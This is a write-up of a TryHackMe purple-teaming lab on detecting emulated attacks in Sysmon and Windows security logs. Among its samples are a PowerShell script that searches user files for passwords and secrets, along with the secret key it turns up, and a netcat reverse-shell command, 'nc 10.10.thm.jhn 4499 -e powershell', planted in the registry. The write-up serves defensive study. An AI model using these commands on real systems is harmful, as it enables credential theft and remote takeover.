---
title: "TryHackMe: Atomic Bird Goes Purple #2 Writeup"
date: 2025-08-27 12:11:00
categories: [TryHackMe, SOC Level 2]
tag: [Threat Emulation, Purple Teaming, Atomic Red Team]
author: Aisha
---


## Introduction

**Challenge Link:** 
[Atomic Bird Goes Purple #2](https://tryhackme.com/room/atomicbirdtwo)

This room is a direct sequel to its first part ([Atomic Bird Goes Purple #1](https://tryhackme.com/room/atomicbirdone)). Check my write-up for the first part. I mentioned the tools and configuration needed for the task.

**Technique Emulation:**

- **Task-1:** Persistence, Privilege Escalation, Defense Evasion, Credential Access ([T1036.004](https://attack.mitre.org/techniques/T1036/004/), [T1552.001](https://attack.mitre.org/techniques/T1552/001/), [T1078.003](https://attack.mitre.org/techniques/T1078/003/))
- **Task-2:** Persistence, Privilege Escalation, Discovery, Collection, Impact ([T1012](https://attack.mitre.org/techniques/T1012/), [T1112](https://attack.mitre.org/techniques/T1112/), [T1491](https://attack.mitre.org/techniques/T1491/), [T1543.003](https://attack.mitre.org/techniques/T1543/003/))

## Task-1: In-Between - Discover and Hide

### **Attacker Simulation:**

The exercise simulates an attacker who:

- **Discovers:** Finds unprotected, cleartext credentials on a system (inspired by technique [**T1552.001**](https://attack.mitre.org/techniques/T1552/001/)).
- **Abuses & Hides:** Uses those stolen credentials to create new **typosquatting** or **masquerading** local user accounts (e.g., creating a user named **`Admin`** instead of **`Administrator`**). This is inspired by technique [**T1078.003**](https://attack.mitre.org/techniques/T1078/003/).
- The goal of these accounts is to act as **decoys** or backdoors for persistent access.

### Test T0002-1: **Search cleartext data**

Run the test

```powershell
PS C:\Users\Administrator> Invoke-AtomicTest T0002 -TestNumbers 1 -ShowDetails
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: TEST T0002
Atomic Test Name: TASK-2.1 Search cleartext data
Atomic Test Number: 1
Atomic Test GUID: 9c8d5a72-9c98-48d3-b9bf-da2cc43bdf52
Description: Data dump for exfiltration

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
C:\AtomicRedTeam\atomics\T0002\cleartxt-scan.ps1

Cleanup Commands:
Command:
C:\AtomicRedTeam\atomics\T0002\del-scan.ps1
[!!!!!!!!END TEST!!!!!!!]

PS C:\Users\Administrator> Invoke-AtomicTest T0002 -TestNumbers 1
---
```

This is the script used for the test: 

```powershell
Get-ChildItem -Path "C:\Users\" -Recurse -Include *.xml,*.doc,*.xls -Exclude "$env:USERPROFILE\Desktop\findings.txt" | Select-String -Pattern "pass|secret" | ForEach-Object {
    $file = $_.Path
    $line = $_.Line
    $matches = $_.Matches.Value
    New-Object -Type PSObject -Property @{
        File = $file
        Line = $line
        Matches = $matches
    }
} | Group-Object -Property File | ForEach-Object {
    $file = $_.Name
    $matches = $_.Group | Select-Object -ExpandProperty Matches
    $location = Split-Path $file
    [PSCustomObject]@{
        File = $file
        Matches = $matches
    }
} | Out-File "$env:USERPROFILE\Desktop\findings.txt"
```

We want to update the script to include all “bak” files

![Alt](/images/Atomic-2/bak.webp)

Run the test and check Sysmon logs

```powershell
PS C:\Users\Administrator> THM-LogStats-Sysmon

|#|#|#|#|#| SYSMON Log Statistics |#|#|#|#|#|

Count Sysmon ID Task Category
----- --------- -------------
   12         1 Process Create (rule: ProcessCreate)
    7        11 File created (rule: FileCreate)

```

Process Filtering

```powershell
PS C:\Users\Administrator> sys-processCreation  -FilterMessage "clear"
=== Sysmon Event ID 1: Process creation ===

UtcTime           : 2025-08-26 07:48:03.971
Image             : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
ProcessId         : 2420
CommandLine       : "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths
                    @"C:\Users\Administrator\AppData\Local\Temp\2\p04fps4g\p04fps4g.cmdline"
ParentProcessId   : 3768
ParentCommandLine : "powershell.exe" & {C:\AtomicRedTeam\atomics\T0002\cleartxt-scan.ps1}

UtcTime           : 2025-08-26 07:48:02.881
Image             : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ProcessId         : 3768
CommandLine       : "powershell.exe" & {C:\AtomicRedTeam\atomics\T0002\cleartxt-scan.ps1}
ParentProcessId   : 4604
ParentCommandLine : "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoLogo

```

Check the findings

```powershell
PS C:\Users\Administrator> type .\Desktop\findings.txt

File                                                                                                               Matc
                                                                                                                   hes
----                                                                                                               ----
C:\Users\Administrator\Documents\WindowsPowerShell\Modules\powershell-yaml\0.4.7\lib\net35\YamlDotNet.xml          {...
C:\Users\Administrator\Documents\WindowsPowerShell\Modules\powershell-yaml\0.4.7\lib\net45\YamlDotNet.xml          {...
C:\Users\Administrator\Documents\WindowsPowerShell\Modules\powershell-yaml\0.4.7\lib\netstandard2.1\YamlDotNet.xml {...
C:\Users\Administrator\Documents\WindowsPowerShell\inf.bak                                                         S...
C:\Users\Administrator\Downloads\sysmon\sysmon-config.xml                                                          {...
C:\Users\Administrator\old.bak                                                                                     S...

PS C:\Users\Administrator> type C:\Users\Administrator\old.bak
Backup!

Wallet: 1K
Secret: L1LAFLHQ5peGsjh7Pee8wHFY1SBQHe85A1HZhVrK47Yf6cqmH3n8

```

### Test T0002-2: **Create clone/decoy account**

This test simulates an attacker masquerading as a legitimate local account

```powershell
PS C:\Users\Administrator> Invoke-AtomicTest T0002-2 -ShowDetails
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: TEST T0002
Atomic Test Name: TASK-2.2 Create clone/decoy account
Atomic Test Number: 2
Atomic Test GUID: d6dc21af-bec9-4152-be86-326b6babd416
Description: Systemfile modification for exfiltration

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
C:\AtomicRedTeam\atomics\T0002\clone.ps1

Cleanup Commands:
Command:
C:\AtomicRedTeam\atomics\T0002\restore-clone.ps1
[!!!!!!!!END TEST!!!!!!!]

```

Security Logs will log newly created accounts 

```powershell
PS C:\Users\Administrator> THM-LogStats-Security

|#|#|#|#|#| SECURITY Log Statistics |#|#|#|#|#|

Count Event ID Task Category
----- -------- -------------
    8     4688 Process Creation
    2     4738 User Account Management
    1     4728 Security Group Management
    1     4798 User Account Management
    1     1102 Log clear
    1     4720 User Account Management
    1     4799 Security Group Management
    1     4732 Security Group Management
    1     4722 User Account Management
    1     4724 User Account Management
```

The new account is `Adminstrator` 

```powershell
PS C:\Users\Administrator> sec-UserCreated
=== Security Event ID 4720: User Account Created ===

TimeCreated      : 8/26/2025 1:55:36 PM
CreatorAccount   : Administrator
CreatorDomain    : ATOMICBIRD
NewAccountName   : Adminstrator
NewAccountDomain : ATOMICBIRD
NewAccountSID    : S-1-5-21-1966530601-3185510712-10604624-1030
SAMAccountName   : Adminstrator

```

Here, the log shows the account `Administrator` was changed to `Adminstrator`

```powershell
PS C:\Users\Administrator> sec-UserAccountChanged
=== Security Event ID 4738: A user account was changed. ===

TimeCreated      : 8/26/2025 1:55:36 PM
SubjectAccount   : Adminstrator
SubjectDomain    : ATOMICBIRD
TargetAccount    : Administrator
TargetDomain     : ATOMICBIRD
TargetAccountSID : S-1-5-21-1966530601-3185510712-10604624-500
SAMAccountName   : -

TimeCreated      : 8/26/2025 1:55:36 PM
SubjectAccount   : Adminstrator
SubjectDomain    : ATOMICBIRD
TargetAccount    : Administrator
TargetDomain     : ATOMICBIRD
TargetAccountSID : S-1-5-21-1966530601-3185510712-10604624-500
SAMAccountName   : -

```

## Task-2: Manipulate, Deface, Persistence

### **Attacker Simulation:**

The exercise simulates an attacker who has gained initial access and is now working to:

- **Maintain Access (Persistence):** Install a backdoor that automatically runs.
- **Change System Behavior (Manipulate):** Alter system settings to their advantage.
- **Deface:** Modify internal content to prove compromise or cause disruption.

### **Techniques Being Simulated:**

Your tasks will be inspired by these four key techniques:

- **T1112 - Modify Registry:** Changing Windows Registry values to reconfigure system settings or hide malicious activity.
- **T1543.003 - Create or Modify System Process: Windows Service:** Creating a new Windows Service to act as a persistent backdoor that runs automatically.
- **T1012 - Query Registry:** Searching the registry to find specific information, such as configuration data or stored credentials, to aid in the attack.
- **TT1491 - Internal Defacement:** Modifying files or web pages on internal network systems to display unauthorized messages (e.g., a hacker's handle), proving the system was compromised.

### Test-1: **T0003-1 Internal service creation:**

This test simulates creating a new Windows Service to act as a persistent backdoor that runs automatically. technique reference [**T1543.003**](https://attack.mitre.org/techniques/T1543/003/)

Run the test and check Sysmon logs:

```powershell
PS C:\Users\Administrator> THM-LogStats-Sysmon

|#|#|#|#|#| SYSMON Log Statistics |#|#|#|#|#|

Count Sysmon ID Task Category
----- --------- -------------
    5         1 Process Create (rule: ProcessCreate)
    4        11 File created (rule: FileCreate)
    2        13 Registry value set (rule: RegistryEvent)
```

Process creation events:

```powershell
PS C:\Users\Administrator> sys-processCreation -FilterMessage "new-service"

=== Sysmon Event ID 1: Process creation ===

UtcTime           : 2025-08-26 09:09:29.456
Image             : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
ProcessId         : 3808
CommandLine       : "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths
                    @"C:\Users\Administrator\AppData\Local\Temp\2\lxzevmgi\lxzevmgi.cmdline"
ParentProcessId   : 4520
ParentCommandLine : "powershell.exe" & {C:\AtomicRedTeam\atomics\T0003\new-service.ps1}

UtcTime           : 2025-08-26 09:09:28.775
Image             : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ProcessId         : 4520
CommandLine       : "powershell.exe" & {C:\AtomicRedTeam\atomics\T0003\new-service.ps1}
ParentProcessId   : 4604
ParentCommandLine : "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoLogo

```

Registry Value set events:

```powershell
PS C:\Users\Administrator>  sys-registryValueSet
=== Sysmon Event ID 13: RegistryEvent (Value Set) ===

UtcTime      : 2025-08-26 09:09:31.289
RuleNumber   : T1031,T1050
EventType    : SetValue
ProcessId    : 616
Image        : C:\Windows\system32\services.exe
TargetObject : HKLM\System\CurrentControlSet\Services\thm-registered-service\ImagePath
Detials      : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File
               C:\AtomicRedTeam\atomics\T0006\defacement.ps1

UtcTime      : 2025-08-26 09:09:31.289
RuleNumber   : T1031,T1050
EventType    : SetValue
ProcessId    : 616
Image        : C:\Windows\system32\services.exe
TargetObject : HKLM\System\CurrentControlSet\Services\thm-registered-service\Start
Detials      : DWORD (0x00000003)

```

Hers, the service process configured a new service that runs automatically and executes a malicious payload `defacement.ps1`   every time the service started.

The Aurora EDR also captured this execution 

```powershell
PS C:\Users\Administrator> THM-LogStats-Aurora

|#|#|#|#|#| APPLICATION -> AURORA Log Statistics |#|#|#|#|#|

Count Event ID Task Category Provider
----- -------- ------------- --------
    1        1 Warning       Sigma rule match found: Whoami.EXE Execution Anomaly (see Details tab for more informat...
    1       99 Warning       Sigma rule match found: Important Windows Eventlog Cleared (see Details tab for more in...
    1       99 Warning       Sigma rule match found: PowerShell as a Service in Registry (see Details tab for more i...
    1       99 Warning       Sigma rule match found: HackTool Service Registration or Execution (see Details tab for...
    1       99 Warning       Sigma rule match found: PowerShell Scripts Installed as Services (see Details tab for m...

```

Service configuration:

```powershell
PS C:\Users\Administrator> sc.exe qc thm-registered-service
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: thm-registered-service
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File C:\AtomicRedTeam\atomics\T0006\defacement.ps1
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : thm-registered-service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

### Test-2: **Defacement with registry**

This test simulates changing Windows Registry values to reconfigure system settings or hide malicious activity. Technique reference [T1112](https://attack.mitre.org/techniques/T1112/)

```powershell
PS C:\Users\Administrator> Invoke-AtomicTest T0003-2 -ShowDetails
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: TEST T0003
Atomic Test Name: TASK-3.2 Defacement with registry
Atomic Test Number: 2
Atomic Test GUID: d6dc21af-bec9-4152-be86-326b6babd416
Description: Defacement with registry

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
C:\AtomicRedTeam\atomics\T0003\defacement.ps1

Cleanup Commands:
Command:
C:\AtomicRedTeam\atomics\T0003\defacement-restore.ps1
[!!!!!!!!END TEST!!!!!!!]

PS C:\Users\Administrator> Invoke-AtomicTest T0003-2
```

Check the Sysmon logs:

```powershell
PS C:\Users\Administrator> THM-LogStats-Sysmon

|#|#|#|#|#| SYSMON Log Statistics |#|#|#|#|#|

Count Sysmon ID Task Category
----- --------- -------------
    7         1 Process Create (rule: ProcessCreate)
    4        11 File created (rule: FileCreate)
    1        13 Registry value set (rule: RegistryEvent)
```

Registry set value events:

```powershell
PS C:\Users\Administrator> sys-registryValueSet
=== Sysmon Event ID 13: RegistryEvent (Value Set) ===

UtcTime      : 2025-08-26 09:13:02.172
RuleNumber   : -
EventType    : SetValue
ProcessId    : 3368
Image        : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LegalNoticeText
Detials      : THM{THM_Offline_Index_Emulation}

```

**TargetObject:** The **`LegalNoticeText`** registry key controls the text that appears in the **legal notice caption** text box. This is the message that appears on the logon screen before a user enters their credentials. The value is being set to a THM flag.

### Test-3: T0003-3 **File changes like a ransom**

This test simulates a ransomware attack where the attacker encrypts data on target systems to interrupt availability to system and network resources. Technique reference [T1486](https://attack.mitre.org/techniques/T1486/) 

```powershell
PS C:\Users\Administrator> Invoke-AtomicTest T0003-3 -ShowDetails
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: TEST T0003
Atomic Test Name: TASK-3.3 File changes like a ransom
Atomic Test Number: 3
Atomic Test GUID: d6dc21af-bec9-4152-be86-326b6babd416
Description: File modification

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
C:\AtomicRedTeam\atomics\T0003\ransom.ps1

Cleanup Commands:
Command:
C:\AtomicRedTeam\atomics\T0003\ransom-restore.ps1
[!!!!!!!!END TEST!!!!!!!]

PS C:\Users\Administrator> Invoke-AtomicTest T0003-3
----
Done executing test: T0003-3 TASK-3.3 File changes like a ransom
```

Security Logs:

```powershell
PS C:\Users\Administrator> THM-LogStats-Security

|#|#|#|#|#| SECURITY Log Statistics |#|#|#|#|#|

Count Event ID Task Category
----- -------- -------------
   24     4663 File System
    6     4688 Process Creation
    1     1102 Log clear
```

The logs show multiple Event ID 4663 (file access attempts) with the access right **`FILE_WRITE_ATTRIBUTES`** on various user data files (PDFs, Excel spreadsheets, Word documents) from **`S:\`** drive**.** 

```powershell
PS C:\Users\Administrator> sec-FileAccess | Select-Object -Unique ObjectName, AccessRights
=== Security Event ID 4663: An attempt was made to access an object ===

ObjectName                                                AccessRights
----------                                                ------------
S:\                                                       FILE_WRITE_ATTRIBUTES
S:\Windows_Server_2019_Feature_Comparison_Guide_EN_US.pdf FILE_WRITE_ATTRIBUTES
S:\Online Sales Tracker.xlsx                              FILE_WRITE_ATTRIBUTES
S:\Minimum Hardware Requirements for Windows 11.pdf       FILE_WRITE_ATTRIBUTES
S:\Invoice with finance charge.xlsx                       FILE_WRITE_ATTRIBUTES
S:\Donation_call.txt                                      FILE_WRITE_ATTRIBUTES
S:\Company certificate.docx                               FILE_WRITE_ATTRIBUTES

```

When checking the drive, all files have been modified to `.thm-jhn`extension

![Alt](/images/Atomic-2/Task3-thm-jhn.webp)

### Test T0003-4: **Planting reverse shell command in the registry**

This test simulates adversaries modifying the registry to hide configuration information, for persistence, or as a way to store a command for execution. Technique reference [T1112](https://attack.mitre.org/techniques/T1112/) 

```powershell
PS C:\Users\Administrator> Invoke-AtomicTest T0003-4 -ShowDetails
PathToAtomicsFolder = C:\AtomicRedTeam\atomics

[********BEGIN TEST*******]
Technique: TEST T0003
Atomic Test Name: TASK-3.4 Planting reverse shell command in the registry
Atomic Test Number: 4
Atomic Test GUID: d6dc21af-bec9-4152-be86-326b6babd416
Description: Reverse shell hook

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
C:\AtomicRedTeam\atomics\T0003\plant.ps1

Cleanup Commands:
Command:
C:\AtomicRedTeam\atomics\T0003\plant-restore.ps1
[!!!!!!!!END TEST!!!!!!!]

```

Check Sysmon logs:

```powershell
PS C:\Users\Administrator> THM-LogStats-Sysmon

|#|#|#|#|#| SYSMON Log Statistics |#|#|#|#|#|

Count Sysmon ID Task Category
----- --------- -------------
   20         1 Process Create (rule: ProcessCreate)
    4        11 File created (rule: FileCreate)
    2        12 Registry object added or deleted (rule: RegistryEvent)
    2        13 Registry value set (rule: RegistryEvent)
    1         3 Network connection detected (rule: NetworkConnect)

```

Process Creation: 

```powershell
PS C:\Users\Administrator> sys-processCreation -FilterMessage "plant.ps1"
=== Sysmon Event ID 1: Process creation ===

UtcTime           : 2025-08-26 09:14:59.080
Image             : C:\Windows\System32\reg.exe
ProcessId         : 580
CommandLine       : "C:\Windows\system32\reg.exe" add HKLM\SOFTWARE\RevC2 /v call_back /t REG_SZ /d "nc 10.10.thm.jhn
                    4499 -e powershell" /f
ParentProcessId   : 952
ParentCommandLine : "powershell.exe" & {C:\AtomicRedTeam\atomics\T0003\plant.ps1}

UtcTime           : 2025-08-26 09:14:56.693
Image             : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
ProcessId         : 4792
CommandLine       : "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths
                    @"C:\Users\Administrator\AppData\Local\Temp\2\r1iwkn4s\r1iwkn4s.cmdline"
ParentProcessId   : 952
ParentCommandLine : "powershell.exe" & {C:\AtomicRedTeam\atomics\T0003\plant.ps1}

UtcTime           : 2025-08-26 09:14:55.945
Image             : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ProcessId         : 952
CommandLine       : "powershell.exe" & {C:\AtomicRedTeam\atomics\T0003\plant.ps1}
ParentProcessId   : 4604
ParentCommandLine : "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoLogo

```

The **`reg.exe`** process is used to add a new registry key: **`HKLM\SOFTWARE\RevC2`** with a value named **`call_back`** containing the command **`nc 10.10.thm.jhn 4499 -e powershell`**.

Registry query: 

```powershell
PS C:\Users\Administrator> reg query "HKLM\SOFTWARE\RevC2"

HKEY_LOCAL_MACHINE\SOFTWARE\RevC2
    call_back    REG_SZ    nc 10.10.thm.jhn 4499 -e powershell

PS C:\Users\Administrator>
```


